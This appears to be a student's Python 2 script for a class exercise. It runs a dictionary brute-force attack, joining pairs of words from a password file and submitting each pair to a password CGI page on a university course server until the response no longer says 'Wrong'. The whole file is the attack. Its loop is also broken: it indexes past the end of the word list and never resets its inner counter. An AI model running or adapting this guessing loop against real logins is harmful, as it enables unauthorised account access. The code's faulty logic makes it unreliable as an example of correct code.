import urllib, random, re

txt_file = open("password.txt","r")
words_txt = txt_file.read()
txt_file.close()

words = re.findall('[\w]+',words_txt)
index = len(words)
guess = words[0]+"_"+words[0]
count1 = 0
count2 = 0
while True:
    guess = words[count1]+"_"+words[count2]
    url = "http://cgi.soic.indiana.edu/~johfdunc/password.cgi?\
groupname=Group+86&pw="+guess

    try:
        con = urllib.urlopen(url)
        web_page = con.read()
        con.close()
    except:
        print "Error opening:",url
        web_page = ""

    if web_page and "Wrong" not in web_page:
        print "password is "+guess
        break
    print "password "+guess+" failed."
    if count2 != index:
        count2 += 1
    else:
        count1 += 1